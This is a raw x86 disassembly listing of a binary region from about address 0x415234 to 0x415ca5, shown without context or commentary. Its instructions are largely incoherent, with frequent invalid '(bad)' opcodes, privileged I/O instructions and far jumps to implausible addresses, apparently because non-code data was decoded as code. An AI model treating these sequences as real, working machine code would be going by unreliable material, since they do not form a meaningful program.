  415234:	sbb    esp,DWORD PTR [ebp-0x5a5144d0]
  41523a:	xchg   ebp,eax
  41523b:	(bad)  
  41523d:	mov    eax,ds:0x708718
	...
  4152b2:	add    BYTE PTR [eax],al
  4152b4:	add    DWORD PTR [ecx-0x2122293],eax
  4152ba:	mov    cl,0xdd
  4152bc:	stos   BYTE PTR es:[edi],al
  4152bd:	dec    edx
  4152be:	out    0x6e,al
  4152c0:	iret   
  4152c1:	push   edi
  4152c2:	iretw  
  4152c4:	imul   ebp,eax,0x0
  4152c7:	add    ch,dh
  4152c9:	add    BYTE PTR [eax],al
  4152cb:	add    BYTE PTR [eax+0x23],al
  4152ce:	xor    esi,edx
  4152d0:	sub    DWORD PTR [edx],ebx
  4152d2:	in     eax,0x30
  4152d4:	les    esi,FWORD PTR [ebx]
  4152d6:	rcr    edi,cl
  4152d8:	mov    edx,0x9923f7f3
  4152dd:	pop    ebx
  4152de:	es cmp eax,0x94fa5176
  4152e4:	cld    
  4152e5:	test   eax,0xd810ecc3
  4152ea:	bound  esp,QWORD PTR [edx+0x4a5d659]
  4152f0:	fnstenv [edi]
  4152f2:	dec    edi
  4152f3:	or     ch,dh
  4152f5:	adc    al,0xd2
  4152f7:	jnp    0x415359
  4152f9:	rol    BYTE PTR [eax-0x72],0x4a
  4152fd:	test   al,0x18
  4152ff:	dec    eax
  415300:	mov    al,0x64
  415302:	and    eax,0xe702d568
  415307:	adc    cl,BYTE PTR [edx]
  415309:	sti    
  41530a:	mov    bl,0x94
  41530c:	jae    0x4152e2
  41530e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41530f:	fcomp  QWORD PTR [eax+esi*1-0x9]
  415313:	xchg   BYTE PTR [esi+0x35],bl
  415316:	jmp    0x7f867634
  41531b:	or     eax,0xc8ad3f7c
  415320:	mov    ebp,0x43ec56b7
  415325:	in     eax,dx
  415326:	mov    edi,0x5657e493
  41532b:	pop    ebp
  41532c:	xchg   edi,eax
  41532d:	xchg   DWORD PTR [eax+0x28],eax
  415330:	pop    esp
  415331:	push   edx
  415332:	add    bh,BYTE PTR [ebp-0x57e46bdd]
  415338:	push   ecx
  415339:	lds    ecx,FWORD PTR [esi]
  41533b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41533c:	iret   
  41533d:	out    dx,eax
  41533e:	push   cs
  41533f:	(bad)  
  415340:	or     ebx,DWORD PTR [esi]
  415342:	jo     0x41537f
  415344:	jbe    0x4152e7
  415346:	ins    DWORD PTR es:[edi],dx
  415347:	mov    ebp,0x3d1b874c
  41534c:	leave  
  41534d:	jno    0x41536a
  41534f:	jg     0x415303
  415351:	mov    DWORD PTR [edx+0x97d6146],ecx
  415357:	scas   eax,DWORD PTR es:[edi]
  415358:	xor    al,0x26
  41535a:	mov    ebx,0x4e1419d3
  41535f:	test   eax,0x3e4e24f5
  415364:	mov    edx,0xd713060c
  415369:	dec    edi
  41536a:	sbb    ch,BYTE PTR [ecx]
  41536c:	jo     0x4153e2
  41536e:	in     al,dx
  41536f:	jmp    0x8893:0xd75b73c6
  415376:	data16 mov ah,0x60
  415379:	mov    bl,0xe7
  41537b:	pop    eax
  41537c:	enter  0x6dc3,0xe1
  415380:	mov    esi,0xf2828e84
  415385:	loop   0x4153b1
  415387:	mov    dh,0x9e
  415389:	loopne 0x4153e6
  41538b:	lea    ebx,[edx+eiz*4]
  41538e:	lahf   
  41538f:	mov    ds:0x53584d3e,eax
  415394:	out    dx,al
  415395:	js     0x4153a0
  415397:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415398:	mov    cl,0x95
  41539a:	add    edi,DWORD PTR [eax]
  41539c:	lock retf 
  41539e:	sub    cl,cl
  4153a0:	xor    eax,0xaa7c0d44
  4153a5:	dec    edx
  4153a6:	or     ebp,DWORD PTR [ecx-0x5e]
  4153a9:	gs js  0x415340
  4153ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153ad:	mov    esp,0x1da29e9f
  4153b2:	mov    ch,BYTE PTR [esi+edx*1]
  4153b5:	inc    ebp
  4153b6:	clc    
  4153b7:	mov    edi,0x5be8f371
  4153bc:	popf   
  4153bd:	pop    ebx
  4153be:	cmp    edi,DWORD PTR [edi+0x54]
	...
  415431:	add    BYTE PTR [eax],al
  415433:	add    BYTE PTR [ebx+0x73],bl
  415436:	inc    edx
  415437:	or     eax,0x775f3d6a
  41543c:	leave  
  41543d:	bnd jl 0x4153de
  415440:	outs   dx,DWORD PTR ds:[esi]
  415441:	test   DWORD PTR [esp+eax*4+0xe960],eax
  415448:	cmc    
  415449:	add    BYTE PTR [eax],al
  41544b:	add    bl,dl
  41544d:	add    bl,BYTE PTR [ebx-0x6f5825c0]
  415453:	mov    esi,0x29071f7e
  415458:	outs   dx,DWORD PTR ds:[esi]
  415459:	scas   eax,DWORD PTR es:[edi]
  41545a:	mov    ebx,es
  41545c:	in     al,dx
  41545d:	sbb    al,BYTE PTR [esi]
  41545f:	mov    al,es:0x864f5b57
  415465:	scas   eax,DWORD PTR es:[edi]
  415466:	mov    eax,ds:0x80e92080
  41546b:	push   ebp
  41546c:	test   eax,0x204df813
  415471:	pushf  
  415472:	cwde   
  415473:	push   cs
  415474:	push   edi
  415475:	jo     0x4154a1
  415477:	jp     0x415424
  415479:	sbb    BYTE PTR ds:0x1f09393,ch
  41547f:	ret    
  415480:	push   eax
  415481:	stos   DWORD PTR es:[edi],eax
  415482:	xchg   esp,eax
  415483:	je     0x4154f7
  415485:	push   cs
  415486:	push   cs
  415487:	les    ebp,FWORD PTR [eax+0x203b923c]
  41548d:	cmp    al,bl
  41548f:	xor    DWORD PTR [eax*1-0x5f33c679],0x45
  415497:	cdq    
  415498:	aam    0xe5
  41549a:	adc    BYTE PTR [esi-0x1da2bb26],al
  4154a0:	cmp    esi,DWORD PTR [edx-0x251e374b]
  4154a6:	jne    0x4154f9
  4154a8:	jmp    0x415452
  4154aa:	xor    BYTE PTR [esp+ecx*4+0x36408baa],ah
  4154b1:	dec    edx
  4154b2:	out    0x30,al
  4154b4:	xchg   DWORD PTR [eax-0x714a472e],eax
  4154ba:	enter  0xa137,0x2a
  4154be:	les    eax,FWORD PTR [eax+0x4bd54436]
  4154c4:	mov    al,ds:0x6143c523
  4154c9:	lds    edx,FWORD PTR [ecx+ebx*4]
  4154cc:	dec    ebp
  4154cd:	ss push ecx
  4154cf:	xchg   edx,eax
  4154d0:	ja     0x415502
  4154d2:	xchg   ecx,eax
  4154d3:	mov    dl,0xe0
  4154d5:	push   edi
  4154d6:	bound  eax,QWORD PTR [ecx-0x4b]
  4154d9:	sub    esi,ebp
  4154db:	cmc    
  4154dc:	or     edx,esi
  4154de:	xlat   BYTE PTR ds:[ebx]
  4154df:	push   ecx
  4154e0:	jge    0x415521
  4154e2:	rcl    BYTE PTR ds:[ebp-0x59d4835d],cl
  4154e9:	mov    esp,0xf382dd71
  4154ee:	jne    0x415470
  4154f0:	out    dx,eax
  4154f1:	push   es
  4154f2:	in     eax,dx
  4154f3:	jg     0x4154fc
  4154f5:	cdq    
  4154f6:	cmp    DWORD PTR [ebx+ecx*8],eax
  4154f9:	add    ebx,DWORD PTR [eax+0x497bc130]
  4154ff:	mov    BYTE PTR [ecx+0xe],cl
  415502:	pop    esi
  415503:	loopne 0x415561
  415505:	sub    eax,0xb99e8f66
  41550a:	sbb    bl,bh
  41550c:	imul   ecx,edi,0xb2b1fc6f
  415512:	jno    0x4154bf
  415514:	push   edi
  415515:	ja     0x41553f
  415517:	push   edi
  415518:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415519:	in     al,0x34
  41551b:	mov    dl,0x1e
  41551d:	loop   0x41550f
  41551f:	jo     0x4154c5
  415521:	pop    ds
  415522:	cmc    
  415523:	sbb    edi,DWORD PTR [edi-0x23553df]
  415529:	adc    DWORD PTR [edi-0x515bb9b7],ebp
  41552f:	mov    ecx,0xb5ba1e2a
  415534:	adc    BYTE PTR ss:[edi+0x70],dh
  415538:	sub    BYTE PTR [ebx*1-0x1810f3],bh
  41553f:	stos   DWORD PTR es:[edi],eax
  415540:	lahf   
	...
  4155b1:	add    BYTE PTR [eax],al
  4155b3:	add    BYTE PTR [edi+0x5e],bh
  4155b6:	cmc    
  4155b7:	ins    DWORD PTR es:[edi],dx
  4155b8:	cmc    
  4155b9:	out    dx,eax
  4155ba:	call   FWORD PTR [esi-0x5a]
  4155bd:	sub    BYTE PTR [esi+0x31],al
  4155c0:	out    0x54,al
  4155c2:	or     al,0x3f
  4155c4:	push   ebp
  4155c5:	jmp    0x0:0xf50000
  4155cc:	sub    al,0x1a
  4155ce:	fsub   DWORD PTR [edx+ebp*8]
  4155d1:	sbb    eax,0x568006ef
  4155d6:	mov    edx,edx
  4155d8:	pushf  
  4155d9:	sub    BYTE PTR [edi-0x39],cl
  4155dc:	pop    esp
  4155dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155de:	and    eax,0x6d737464
  4155e3:	repnz sbb eax,0x25dab28f
  4155e9:	fcmovb st,st(1)
  4155eb:	fwait
  4155ec:	rcr    BYTE PTR [ecx-0x2],cl
  4155ef:	stos   BYTE PTR es:[edi],al
  4155f0:	rcr    bl,0x44
  4155f3:	pop    ecx
  4155f4:	daa    
  4155f5:	fwait
  4155f6:	std    
  4155f7:	lods   eax,DWORD PTR ds:[esi]
  4155f8:	daa    
  4155f9:	or     ah,BYTE PTR [edi]
  4155fb:	push   eax
  4155fc:	jge    0x415591
  4155fe:	rcr    esp,0x89
  415601:	adc    al,bh
  415603:	cmp    al,0x19
  415605:	dec    edi
  415606:	test   DWORD PTR [ebx],esp
  415608:	push   ecx
  415609:	retf   
  41560a:	pushf  
  41560b:	inc    ebp
  41560c:	adc    ebx,DWORD PTR [ecx-0xe4b67b0]
  415612:	enter  0xd391,0xe6
  415616:	dec    ebp
  415617:	test   al,0xb9
  415619:	and    eax,0xeb3365fa
  41561e:	(bad)  
  41561f:	xchg   ebx,eax
  415620:	jge    0x415638
  415622:	rol    BYTE PTR [ebx+0x37],0x83
  415626:	and    al,0x86
  415628:	loopne 0x4155ae
  41562a:	or     al,0xe9
  41562c:	shr    BYTE PTR [ebp+0x11a86408],cl
  415632:	das    
  415633:	xchg   ebp,eax
  415634:	mov    ds:0x40a691d9,al
  415639:	stos   DWORD PTR es:[edi],eax
  41563a:	lds    edx,FWORD PTR [edi]
  41563c:	in     eax,0x11
  41563e:	and    ch,bl
  415640:	out    dx,al
  415641:	jge    0x4156a2
  415643:	stos   BYTE PTR es:[edi],al
  415644:	mov    al,0x34
  415646:	fist   WORD PTR [edx+ecx*2-0x2f446bb0]
  41564d:	inc    edi
  41564e:	and    al,0x7a
  415650:	mov    dl,0x44
  415652:	lods   al,BYTE PTR ds:[esi]
  415653:	es push cs
  415655:	scas   eax,DWORD PTR es:[edi]
  415656:	rcl    BYTE PTR [eax+0x2fbdd68b],1
  41565c:	sbb    ah,BYTE PTR [eax+0x3e]
  41565f:	fwait
  415660:	sahf   
  415661:	and    eax,0x5aa32b9
  415666:	mov    bl,0x17
  415668:	cwde   
  415669:	sahf   
  41566a:	jne    0x4156bb
  41566c:	fst    QWORD PTR [ebx-0x81ad030]
  415672:	sub    ecx,DWORD PTR [eax+0x6b]
  415675:	xchg   ah,ch
  415677:	adc    ebp,ebp
  415679:	jge    0x4155fd
  41567b:	frstor [eax]
  41567d:	nop
  41567e:	mov    DWORD PTR ss:[ebp+0x5315fd75],edx
  415685:	adc    DWORD PTR [edx+0x47566368],ebx
  41568b:	and    al,BYTE PTR [ebx]
  41568d:	or     esi,esp
  41568f:	pop    ebx
  415690:	push   edi
  415691:	cli    
  415692:	(bad)  
  415693:	fidiv  DWORD PTR [eax-0x38]
  415696:	mov    esp,0x40bf10b6
  41569b:	gs xchg ebx,edi
  41569e:	stos   BYTE PTR es:[edi],al
  41569f:	push   es
  4156a0:	jo     0x41570f
  4156a2:	jmp    0x415711
  4156a4:	leave  
  4156a5:	jp     0x4156c9
  4156a7:	lahf   
  4156a8:	cmp    DWORD PTR [ecx+ecx*4-0x5a],esp
  4156ac:	or     DWORD PTR [edi+0x3f],0x2eb73d05
  4156b3:	clc    
  4156b4:	cdq    
  4156b5:	jno    0x415728
  4156b7:	mov    WORD PTR [ecx+0x31df1a25],ss
  4156bd:	xchg   esi,eax
  4156be:	std    
  4156bf:	xchg   ebx,eax
  4156c0:	and    DWORD PTR [eax],eax
	...
  415732:	add    BYTE PTR [eax],al
  415734:	jle    0x415765
  415736:	add    DWORD PTR [ebp+0x51],ebp
  415739:	outs   dx,DWORD PTR ds:[esi]
  41573a:	jle    0x41577b
  41573c:	dec    esp
  41573d:	xchg   esp,eax
  41573e:	call   0xd263fed3
  415743:	loope  0x41578f
  415745:	jmp    0x415747
  415747:	add    ch,dh
  415749:	add    BYTE PTR [eax],al
  41574b:	add    BYTE PTR [esi],ah
  41574d:	xchg   ebx,eax
  41574e:	inc    ecx
  41574f:	rcr    BYTE PTR [esi-0x75],0xe3
  415753:	leave  
  415754:	adc    DWORD PTR [eax+ebx*2],ebx
  415757:	ret    0x1f2e
  41575a:	sahf   
  41575b:	loope  0x4157a8
  41575d:	fsubr  DWORD PTR [ebx]
  41575f:	mov    edx,0xb200cf12
  415764:	sub    ah,BYTE PTR [edx]
  415766:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415767:	mov    al,bl
  415769:	in     eax,0xca
  41576b:	xchg   esi,eax
  41576c:	add    esp,esp
  41576e:	xchg   edi,eax
  41576f:	hlt    
  415770:	push   ds
  415771:	test   eax,esp
  415773:	add    dl,ah
  415775:	pusha  
  415776:	mov    ah,0xcb
  415778:	lds    ecx,FWORD PTR [ebx+0x7d]
  41577b:	xchg   ebp,eax
  41577c:	xchg   edi,eax
  41577d:	shr    BYTE PTR [eax],cl
  41577f:	stos   BYTE PTR es:[edi],al
  415780:	add    eax,0xc89db39e
  415785:	adc    al,0xff
  415787:	dec    ebp
  415788:	ror    DWORD PTR [eax+0x1f],1
  41578b:	sub    BYTE PTR [eax+0xb],dh
  41578e:	xchg   ecx,eax
  41578f:	sub    dl,bl
  415791:	inc    edx
  415792:	(bad)  
  415793:	push   cs
  415794:	dec    ebx
  415795:	(bad)  
  415796:	icebp  
  415797:	mul    DWORD PTR [ebp+0x6a151ca6]
  41579d:	adc    DWORD PTR [ebp+0x604c2e44],0x4a468a2c
  4157a7:	rol    BYTE PTR [ebp+0x6],1
  4157aa:	gs es (bad) 
  4157ad:	push   edi
  4157ae:	push   esp
  4157af:	inc    edx
  4157b0:	pop    ecx
  4157b1:	and    esi,esp
  4157b3:	pop    ds
  4157b4:	xchg   esi,eax
  4157b5:	sub    al,0x40
  4157b7:	test   eax,0xf3a66ac8
  4157bc:	scas   eax,DWORD PTR es:[edi]
  4157bd:	shl    BYTE PTR [edx],cl
  4157bf:	mov    edi,0x7a809ac3
  4157c4:	sub    DWORD PTR [ebx],esp
  4157c6:	int    0x3
  4157c8:	loop   0x415751
  4157ca:	inc    edx
  4157cb:	imul   ebp,DWORD PTR [ebp+0x6b],0x544f4820
  4157d2:	lds    ebp,FWORD PTR [ebx]
  4157d4:	or     ebx,0x75
  4157d7:	sbb    ecx,edi
  4157d9:	aas    
  4157da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157db:	xor    eax,0xf0e2a30d
  4157e0:	pop    ebp
  4157e1:	dec    eax
  4157e2:	stc    
  4157e3:	add    eax,DWORD PTR [eax+0x3acfd0f7]
  4157e9:	mov    al,BYTE PTR [edi+0x69de0b09]
  4157ef:	fwait
  4157f0:	sahf   
  4157f1:	repz xchg esp,eax
  4157f3:	or     BYTE PTR [edi+0x17],al
  4157f6:	int3   
  4157f7:	inc    ecx
  4157f8:	push   ss
  4157f9:	xor    DWORD PTR [ebp+0x46],ecx
  4157fc:	leave  
  4157fd:	and    eax,0x22883298
  415802:	adc    eax,0xf3a1f23e
  415807:	std    
  415808:	in     eax,dx
  415809:	mov    WORD PTR [edi+edx*8-0x37],ss
  41580d:	pushf  
  41580e:	adc    DWORD PTR [ebp+0x64],esp
  415811:	inc    ecx
  415812:	aad    0x1d
  415814:	sbb    al,0xcb
  415816:	adc    al,0x44
  415818:	or     al,0xd5
  41581a:	loopne 0x41581b
  41581c:	scas   eax,DWORD PTR es:[edi]
  41581d:	pop    edi
  41581e:	inc    ecx
  41581f:	fdiv   DWORD PTR [edi]
  415821:	push   es
  415822:	cld    
  415823:	jge    0x415831
  415825:	mov    eax,0x97918301
  41582a:	mov    dh,0xb6
  41582c:	xchg   ebp,eax
  41582d:	les    edi,FWORD PTR [ecx-0x16]
  415830:	(bad)  
  415831:	sar    DWORD PTR [edx],1
  415833:	xchg   BYTE PTR [esi+ebx*4+0x37],bl
  415837:	mov    eax,0x2e34f3c9
  41583c:	fwait
  41583d:	cmp    al,0x66
  41583f:	dec    eax
  415840:	cmp    al,BYTE PTR [eax]
	...
  4158b2:	add    BYTE PTR [eax],al
  4158b4:	or     edi,DWORD PTR [esi-0x2e]
  4158b7:	and    esi,edi
  4158b9:	scas   eax,DWORD PTR es:[edi]
  4158ba:	sti    
  4158bb:	jle    0x41583e
  4158bd:	inc    eax
  4158be:	sbb    eax,0x5cca83fe
  4158c3:	iret   
  4158c4:	aas    
  4158c5:	in     al,dx
  4158c6:	add    BYTE PTR [eax],al
  4158c8:	cmc    
  4158c9:	add    BYTE PTR [eax],al
  4158cb:	add    ch,ch
  4158cd:	push   esp
  4158ce:	jne    0x4158ac
  4158d0:	jmp    0xc0b8:0x6356f671
  4158d7:	cmp    BYTE PTR [edx+ebp*1],dl
  4158da:	sub    eax,0x4958348b
  4158df:	retf   
  4158e0:	retf   
  4158e1:	dec    esp
  4158e2:	mov    ebp,es
  4158e4:	pusha  
  4158e5:	fcomip st,st(2)
  4158e7:	pop    ebp
  4158e9:	outs   dx,DWORD PTR ds:[esi]
  4158ea:	outs   dx,DWORD PTR ds:[esi]
  4158eb:	xor    bl,BYTE PTR [esi+0x57]
  4158ee:	cld    
  4158ef:	adc    DWORD PTR [ebx-0x10],esp
  4158f2:	jb     0x415874
  4158f4:	shl    bl,1
  4158f6:	test   BYTE PTR [edi+0x4f],ah
  4158f9:	xchg   ecx,eax
  4158fa:	fstp   TBYTE PTR [ecx+0x5f4ebce2]
  415900:	mov    eax,ds:0xf309ce86
  415905:	repnz lods al,BYTE PTR ds:[esi]
  415907:	leave  
  415908:	sub    BYTE PTR [edx-0x11f8a409],al
  41590e:	and    esi,DWORD PTR [edi+0x1f]
  415911:	test   ecx,0xfdc6f871
  415917:	cli    
  415918:	int    0x50
  41591a:	push   ecx
  41591b:	sbb    esi,DWORD PTR [edx+0x70]
  41591e:	loopne 0x415903
  415920:	push   0xcc080b21
  415925:	adc    esp,DWORD PTR [ebx]
  415927:	push   es
  415928:	mov    bl,0xf2
  41592a:	dec    edi
  41592b:	jne    0x415965
  41592d:	(bad)  
  41592e:	xor    esp,esp
  415930:	push   edx
  415931:	sbb    esi,DWORD PTR [edx+0x3256e2ef]
  415937:	fstp   TBYTE PTR ds:0x4b58cc32
  41593d:	mov    esi,0x458188c2
  415942:	dec    esp
  415943:	stos   BYTE PTR es:[edi],al
  415944:	cdq    
  415945:	and    al,0x18
  415947:	push   cs
  415948:	mov    ebp,0x27ad29f2
  41594d:	add    eax,0xf61b0725
  415952:	pop    esi
  415953:	mov    ebx,0x5d27d48c
  415958:	jg     0x4158e4
  41595a:	push   es
  41595b:	mov    ds:0x811523e8,eax
  415960:	sub    bl,BYTE PTR [eax]
  415962:	outs   dx,BYTE PTR ds:[esi]
  415963:	stc    
  415964:	cli    
  415965:	push   0x78
  415967:	xlat   BYTE PTR ds:[ebx]
  415968:	inc    ecx
  415969:	add    DWORD PTR [ebx],ebx
  41596b:	xchg   ebp,eax
  41596c:	ss loopne 0x4159d2
  41596f:	fst    QWORD PTR [esi+0x7c]
  415972:	mov    DWORD PTR fs:[ebp+0x8],edi
  415976:	clc    
  415977:	adc    eax,0xfd4bc331
  41597c:	and    ecx,esp
  41597e:	inc    eax
  41597f:	pop    ebx
  415980:	stos   DWORD PTR es:[edi],eax
  415981:	or     DWORD PTR [ecx],ebx
  415983:	or     eax,0xc61113c
  415988:	pop    ss
  415989:	test   eax,0x9e1a1cd3
  41598e:	les    edx,FWORD PTR ds:0xb3f2069c
  415994:	loopne 0x4159f5
  415996:	mov    cl,0xff
  415998:	push   ebx
  415999:	mov    dl,0xf3
  41599b:	push   ss
  41599c:	inc    edx
  41599d:	jb     0x415941
  41599f:	jb     0x41594d
  4159a1:	lods   al,BYTE PTR ds:[esi]
  4159a2:	push   edi
  4159a3:	mov    esp,0x63362fdc
  4159a8:	inc    eax
  4159a9:	push   0x2b
  4159ab:	jp     0x41597e
  4159ad:	out    0x25,eax
  4159af:	pusha  
  4159b0:	push   eax
  4159b1:	pop    esi
  4159b2:	or     al,0xa
  4159b4:	inc    eax
  4159b5:	out    dx,eax
  4159b6:	pop    edx
  4159b7:	mov    ebp,0xc688c8ab
  4159bc:	sahf   
  4159bd:	call   0x479af3
	...
  415a32:	add    BYTE PTR [eax],al
  415a34:	lahf   
  415a35:	fnstcw WORD PTR [esi]
  415a37:	ss jle 0x415a31
  415a3a:	lahf   
  415a3b:	stc    
  415a3c:	inc    ecx
  415a3d:	jb     0x415a8e
  415a3f:	lahf   
  415a40:	lahf   
  415a41:	inc    ebp
  415a42:	jno    0x415a68
  415a44:	xor    al,0xed
  415a46:	add    BYTE PTR [eax],al
  415a48:	cmc    
  415a49:	add    BYTE PTR [eax],al
  415a4b:	add    BYTE PTR [ebx-0x69],al
  415a4e:	loope  0x415a35
  415a50:	adc    dl,BYTE PTR [ecx+eiz*8-0x72]
  415a54:	lea    eax,[edx+0x70]
  415a57:	icebp  
  415a58:	in     al,dx
  415a59:	mov    al,ds:0xa951d884
  415a5e:	(bad)  
  415a5f:	sub    eax,0xa206cea8
  415a64:	jno    0x415a09
  415a66:	hlt    
  415a67:	inc    ecx
  415a68:	cmp    DWORD PTR [esi],ebp
  415a6a:	jbe    0x415a1a
  415a6c:	nop
  415a6d:	aas    
  415a6e:	dec    edi
  415a6f:	push   ds
  415a70:	aam    0x36
  415a72:	aas    
  415a73:	retf   
  415a74:	data16 sbb ch,ah
  415a77:	aaa    
  415a78:	popf   
  415a79:	fs sub cl,bl
  415a7c:	fild   DWORD PTR [ecx-0x33ef0500]
  415a82:	leave  
  415a83:	ror    DWORD PTR [edi],cl
  415a85:	jle    0x415ae4
  415a87:	or     ch,bl
  415a89:	sar    BYTE PTR [edi+0x25],cl
  415a8c:	(bad)  
  415a8d:	aad    0xd8
  415a8f:	jae    0x415a4f
  415a91:	(bad)  
  415a92:	xchg   ebx,eax
  415a93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a94:	pop    ebx
  415a95:	jmp    0x415a74
  415a97:	scas   al,BYTE PTR es:[edi]
  415a98:	jmp    0xb8a2a452
  415a9d:	mov    al,ds:0xc9bc999a
  415aa2:	(bad)  
  415aa4:	dec    esp
  415aa5:	sti    
  415aa6:	jb     0x415a9d
  415aa8:	adc    DWORD PTR [eax+0xb],esp
  415aab:	lods   eax,DWORD PTR ds:[esi]
  415aac:	xchg   ebp,eax
  415aad:	push   edi
  415aae:	jbe    0x415a90
  415ab0:	jmp    0x415b30
  415ab2:	dec    esi
  415ab3:	mov    esp,0x3f6a1fbf
  415ab8:	out    0xc3,al
  415aba:	and    al,al
  415abc:	repz mov ah,BYTE PTR [ebx-0x76]
  415ac0:	inc    edx
  415ac1:	stos   BYTE PTR es:[edi],al
  415ac2:	jbe    0x415ab3
  415ac4:	xchg   edi,eax
  415ac5:	pop    ss
  415ac6:	nop
  415ac7:	pop    esp
  415ac8:	push   0x9d3e66cd
  415acd:	imul   edi,esi,0x21
  415ad0:	or     DWORD PTR [eax-0x193b5132],esi
  415ad6:	adc    esp,eax
  415ad8:	jle    0x415af4
  415ada:	das    
  415adb:	push   cs
  415adc:	scas   al,BYTE PTR es:[edi]
  415add:	dec    ebx
  415ade:	jns    0x415b5a
  415ae0:	dec    ebx
  415ae1:	jecxz  0x415b09
  415ae3:	outs   dx,BYTE PTR ds:[esi]
  415ae4:	push   ss
  415ae5:	ret    0xcc1
  415ae8:	cmp    ah,BYTE PTR [ebx-0x7b]
  415aeb:	inc    ebp
  415aec:	iret   
  415aed:	(bad)  
  415aee:	out    dx,eax
  415aef:	sub    al,0x8d
  415af1:	repz push esp
  415af3:	pusha  
  415af4:	and    eax,0x1c930b21
  415af9:	leave  
  415afa:	icebp  
  415afb:	fucom  st(6)
  415afd:	dec    esp
  415afe:	pop    es
  415aff:	mov    ch,0xe0
  415b01:	js     0x415b33
  415b03:	aas    
  415b04:	std    
  415b05:	adc    dl,BYTE PTR [esi+0x52]
  415b08:	sub    eax,ebp
  415b0a:	push   es
  415b0b:	mov    ebp,0xba5f7173
  415b10:	add    edi,DWORD PTR [ebp-0x5c]
  415b13:	jb     0x415aec
  415b15:	in     al,dx
  415b16:	or     DWORD PTR [edi+edi*1-0x5d],eax
  415b1a:	push   esp
  415b1b:	sahf   
  415b1c:	push   ebp
  415b1d:	push   cs
  415b1e:	cmp    eax,0xb01c51d5
  415b23:	pop    ss
  415b24:	xchg   edi,eax
  415b25:	mov    ecx,0x3c6867e3
  415b2a:	xchg   ebp,eax
  415b2b:	mov    bh,0xf1
  415b2d:	mov    ebx,0xab7e47a4
  415b32:	repnz test eax,0xc861d9f7
  415b38:	mov    esp,0x117d1ac4
  415b3d:	inc    esi
  415b3e:	xor    BYTE PTR [eax],dl
  415b40:	pop    es
	...
  415bb1:	add    BYTE PTR [eax],al
  415bb3:	add    BYTE PTR [esp+eiz*2],dh
  415bb6:	push   ds
  415bb7:	jl     0x415c17
  415bb9:	jle    0x415c31
  415bbb:	ins    BYTE PTR es:[edi],dx
  415bbc:	pop    ds
  415bbd:	dec    DWORD PTR [edi+0x5a]
  415bc0:	dec    edx
  415bc1:	ss int3 
  415bc3:	mov    bh,0x29
  415bc5:	out    dx,al
  415bc6:	add    BYTE PTR [eax],al
  415bc8:	cmc    
  415bc9:	add    BYTE PTR [eax],al
  415bcb:	add    BYTE PTR [esi-0x6d],al
  415bce:	enter  0xdc10,0xe6
  415bd2:	sti    
  415bd3:	and    al,0x86
  415bd5:	call   0xf7fbd6f7
  415bda:	push   es
  415bdb:	or     DWORD PTR [esi],esi
  415bdd:	in     al,dx
  415bde:	push   cs
  415bdf:	push   0xada75140
  415be4:	mov    edx,0x439fb770
  415be9:	adc    eax,0x1b2718a8
  415bee:	jg     0x415b7a
  415bf0:	xlat   BYTE PTR ds:[ebx]
  415bf1:	inc    ebx
  415bf2:	sahf   
  415bf3:	push   esp
  415bf4:	ret    
  415bf5:	(bad)  
  415bf6:	js     0x415baf
  415bf8:	mov    ch,0x32
  415bfa:	(bad)
  415bfe:	stos   DWORD PTR es:[edi],eax
  415bff:	int3   
  415c00:	push   ebx
  415c01:	std    
  415c02:	sbb    al,0xf9
  415c04:	push   edi
  415c05:	ds stos DWORD PTR es:[edi],eax
  415c07:	xchg   edi,eax
  415c08:	sub    bl,ch
  415c0a:	mov    esi,ebp
  415c0c:	mov    bh,0x5a
  415c0e:	fs dec esp
  415c10:	rol    DWORD PTR [edx+0x0],1
  415c13:	sbb    al,0x50
  415c15:	xchg   DWORD PTR [ecx-0x5ad72546],esi
  415c1b:	enter  0x4942,0x6a
  415c1f:	ins    BYTE PTR es:[edi],dx
  415c20:	enter  0x1b7f,0xb
  415c24:	jl     0x415bfd
  415c26:	sbb    ebx,DWORD PTR fs:[esi+0x1a834f48]
  415c2d:	cwde   
  415c2e:	push   ds
  415c2f:	sbb    bh,dl
  415c31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c32:	dec    ebp
  415c33:	jne    0x415c9c
  415c35:	cwde   
  415c36:	test   eax,0xf65f6d7c
  415c3b:	(bad)  
  415c3c:	pop    esp
  415c3d:	push   edx
  415c3e:	xor    al,0xd1
  415c40:	and    eax,0x85dee27f
  415c46:	pop    eax
  415c47:	out    dx,eax
  415c48:	mov    dl,0x32
  415c4a:	add    al,0xde
  415c4c:	and    al,0x4c
  415c4e:	lds    ebp,FWORD PTR [eax+0x46]
  415c51:	ret    
  415c52:	xor    bh,dh
  415c54:	pop    eax
  415c55:	inc    ebp
  415c56:	push   edx
  415c57:	out    0x88,al
  415c59:	jg     0x415cc9
  415c5b:	dec    esi
  415c5c:	ja     0x415c23
  415c5e:	jmp    0x415bf2
  415c60:	aam    0x96
  415c62:	pop    edx
  415c63:	sub    ebx,DWORD PTR [ebx+0x778b9579]
  415c69:	(bad)  
  415c6a:	outs   dx,BYTE PTR ds:[esi]
  415c6b:	ffreep st(7)
  415c6d:	jo     0x415c91
  415c6f:	xchg   edx,eax
  415c70:	push   ds
  415c71:	out    dx,al
  415c72:	sub    eax,0x161dc3ec
  415c77:	leave  
  415c78:	cmp    dh,BYTE PTR [ecx+eiz*4-0x29b5d8e]
  415c7f:	push   edx
  415c80:	push   cs
  415c81:	sub    BYTE PTR [esp+ecx*8+0x45],dl
  415c85:	dec    edx
  415c86:	lock imul edx,esi,0x5439496d
  415c8d:	test   al,0x1b
  415c8f:	iret   
  415c90:	jmp    0x415d0b
  415c92:	(bad)
  415c96:	jl     0x415cfb
  415c98:	mov    dh,0xc
  415c9a:	sub    ebp,edx
  415c9c:	xlat   BYTE PTR fs:[ebx]
  415c9e:	push   eax
  415c9f:	aas    
  415ca0:	push   ds
  415ca1:	(bad)  [eax+0x64]
  415ca4:	(bad)  
  415ca5:	xor    DWORD PTR [edx-0x4aac383b],ebp
